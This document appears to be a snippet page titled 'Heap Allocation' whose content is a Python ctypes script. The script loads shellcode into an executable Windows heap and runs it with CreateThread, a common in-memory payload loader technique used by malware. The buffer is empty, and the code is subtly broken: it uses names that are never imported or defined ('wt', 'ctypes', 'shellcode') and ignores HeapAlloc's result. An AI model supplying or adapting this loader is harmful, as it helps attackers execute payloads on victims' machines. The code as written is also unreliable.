# Heap Allocation

```python
from ctypes import *

kernel32 = ctypes.windll.kernel32

HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
HEAP_ZERO_MEMORY = 0x00000008

HeapCreate = kernel32.HeapCreate

HeapCreate.argtypes = [wt.DWORD, ctypes.c_size_t, ctypes.c_size_t]
HeapCreate.restype = wt.HANDLE

HeapAlloc = kernel32.HeapAlloc

HeapAlloc.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_size_t]
HeapAlloc.restype = wt.LPVOID

RtlMoveMemory = kernel32.RtlMoveMemory
RtlMoveMemory.argtypes = (
	ctypes.c_void_p,
	ctypes.c_void_p,
	ctypes.c_size_t
)

CreateThread = kernel32.CreateThread

CreateThread.argtypes = [
	wt.LPVOID, ctypes.c_size_t, wt.LPVOID,
	wt.LPVOID, wt.DWORD, wt.LPVOID
]

WaitForSingleObject = kernel32.WaitForSingleObject

WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
WaitForSingleObject.restype = wt.DWORD

def execute(shellcode):
	heap = HeapCreate(
		HEAP_CREATE_ENABLE_EXECUTE, len(shellcode), 0
	)
	HeapAlloc(heap, HEAP_ZERO_MEMORY, len(shellcode))
	print('[*] HeapAlloc() Memory at: {:08X}'.format(heap))

	RtlMoveMemory(heap, shellcode, len(shellcode))
	print('[*] Shellcode copied into memory.')

	thread = CreateThread(0, 0, heap, 0, 0, 0)
	print('[*] CreateThread() in same process.')
	WaitForSingleObject(thread, 0xFFFFFFFF)

def main() -> None:
	buffer = b""
	
	execute(shellcode)

if __name__ == '__main__':
	main()
```